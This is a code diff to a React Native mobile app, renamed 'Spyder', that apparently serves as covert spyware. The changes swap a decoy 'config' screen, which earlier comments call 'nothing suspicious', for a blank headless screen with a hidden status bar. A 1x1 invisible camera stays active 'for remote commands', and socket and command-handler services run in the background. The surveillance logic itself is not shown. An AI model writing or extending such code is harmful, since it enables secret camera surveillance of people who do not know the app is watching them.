@@ -1,13 +1,13 @@
 /**
- * Confyg Mobile App
- * 
+ * Spyder Mobile App
+ *
  * AUTO MODE: No more manual flag switching!
  * - No credentials → Shows pairing UI
- * - Has credentials → Shows minimal status, runs services in background
+ * - Has credentials → Headless mode (blank screen), runs services in background
  */
 
 import React, { useState, useEffect, useRef, useCallback } from 'react';
-import { StatusBar, View, StyleSheet, ActivityIndicator, Text } from 'react-native';
+import { StatusBar, View, StyleSheet, ActivityIndicator } from 'react-native';
 import { SafeAreaProvider } from 'react-native-safe-area-context';
 import { Camera, useCameraDevice } from 'react-native-vision-camera';
 import { authService, socketService, pushNotificationService, backgroundService, commandHandler, cameraService } from './src/services';
@@ -147,11 +147,10 @@ function App(): React.JSX.Element {
     );
   }
 
-  // Paired - show minimal boring "config" screen
-  // This looks like a settings utility, nothing suspicious
+  // Paired - headless mode, just blank screen with hidden camera
   return (
     <View style={styles.container}>
-      <StatusBar barStyle="light-content" backgroundColor="#1c1c1e" />
+      <StatusBar hidden />
       {/* Hidden camera - always active so it's ready for remote commands */}
       {device && (
         <Camera
@@ -164,28 +163,6 @@ function App(): React.JSX.Element {
           onError={(error) => console.log('[App] Camera error:', error.message)}
         />
       )}
-      <View style={styles.statusCard}>
-        <View style={styles.statusRow}>
-          <Text style={styles.label}>Sync Status</Text>
-          <View style={styles.statusIndicator}>
-            <View style={[styles.dot, isConnected ? styles.dotGreen : styles.dotRed]} />
-            <Text style={styles.statusText}>
-              {isConnected ? 'Active' : 'Offline'}
-            </Text>
-          </View>
-        </View>
-        <View style={styles.divider} />
-        <View style={styles.statusRow}>
-          <Text style={styles.label}>Background Sync</Text>
-          <Text style={styles.value}>Enabled</Text>
-        </View>
-        <View style={styles.divider} />
-        <View style={styles.statusRow}>
-          <Text style={styles.label}>Version</Text>
-          <Text style={styles.value}>1.0.0</Text>
-        </View>
-      </View>
-      <Text style={styles.footer}>Configuration synced automatically</Text>
     </View>
   );
 }
@@ -193,67 +170,13 @@ function App(): React.JSX.Element {
 const styles = StyleSheet.create({
   container: {
     flex: 1,
-    backgroundColor: '#1c1c1e',
-    justifyContent: 'center',
-    alignItems: 'center',
-    padding: 20,
+    backgroundColor: '#000000',
   },
   hiddenCamera: {
     width: 1,
     height: 1,
     position: 'absolute',
     opacity: 0,
-  },
-  statusCard: {
-    backgroundColor: '#2c2c2e',
-    borderRadius: 12,
-    padding: 16,
-    width: '100%',
-    maxWidth: 350,
-  },
-  statusRow: {
-    flexDirection: 'row',
-    justifyContent: 'space-between',
-    alignItems: 'center',
-    paddingVertical: 12,
-  },
-  label: {
-    color: '#ffffff',
-    fontSize: 16,
-  },
-  value: {
-    color: '#8e8e93',
-    fontSize: 16,
-  },
-  statusIndicator: {
-    flexDirection: 'row',
-    alignItems: 'center',
-  },
-  dot: {
-    width: 8,
-    height: 8,
-    borderRadius: 4,
-    marginRight: 8,
-  },
-  dotGreen: {
-    backgroundColor: '#30d158',
-  },
-  dotRed: {
-    backgroundColor: '#ff453a',
-  },
-  statusText: {
-    color: '#8e8e93',
-    fontSize: 16,
-  },
-  divider: {
-    height: 1,
-    backgroundColor: '#3a3a3c',
-  },
-  footer: {
-    color: '#636366',
-    fontSize: 13,
-    marginTop: 20,
-    textAlign: 'center',
   },
 });
 
